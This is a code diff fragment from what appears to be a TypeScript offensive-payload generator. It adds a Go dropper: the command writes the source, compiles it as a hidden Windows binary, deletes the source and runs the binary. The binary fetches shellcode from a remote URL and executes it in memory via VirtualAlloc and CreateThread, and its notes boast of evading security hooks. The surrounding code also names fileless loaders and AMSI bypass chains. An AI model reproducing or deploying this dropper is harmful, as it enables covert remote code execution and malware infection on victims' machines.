+      command:`cat > C:\\Users\\Public\\nx.go << 'EOF'
+package main
+import (
+  "net/http"; "os"; "unsafe"
+  "syscall"
+)
+var (
+  k32=syscall.NewLazyDLL("kernel32.dll")
+  vaFn=k32.NewProc("VirtualAlloc")
+  ctFn=k32.NewProc("CreateThread")
+  wfFn=k32.NewProc("WaitForSingleObject")
+)
+func main(){
+  r,_:=http.Get("${url}/sc.bin")
+  if r==nil{os.Exit(1)}
+  defer r.Body.Close()
+  buf:=make([]byte,65536);n,_:=r.Body.Read(buf);sc:=buf[:n]
+  addr,_,_:=vaFn.Call(0,uintptr(len(sc)),0x3000,0x40)
+  for i,b:=range sc{*(*byte)(unsafe.Pointer(addr+uintptr(i)))=b}
+  ht,_,_:=ctFn.Call(0,0,addr,0,0,0)
+  wfFn.Call(ht,0xFFFFFFFF)
+}
+EOF
+go build -ldflags="-s -w -H windowsgui" -trimpath -o C:\\Users\\Public\\nx.exe C:\\Users\\Public\\nx.go 2>nul && del C:\\Users\\Public\\nx.go && C:\\Users\\Public\\nx.exe`,
+      notes:"Go Windows binary — no CRT/MSVCRT dependencies. -H windowsgui creates windowless process. VirtualAlloc+CreateThread via syscall.NewLazyDLL bypasses many hook layers.",
     },
   ];
 }
@@ -196,5 +276,6 @@ export function buildAllShadowPayloads(lhost: string, lport: string): ShadowPayl
     ...buildLinuxFilelessLoaders(lhost, lport),
     ...buildWindowsInMemoryLoaders(lhost, lport),
     ...buildAmsiBypassChains(lhost, lport),
+    ...buildGoRustDroppers(lhost, lport),
   ];
 }
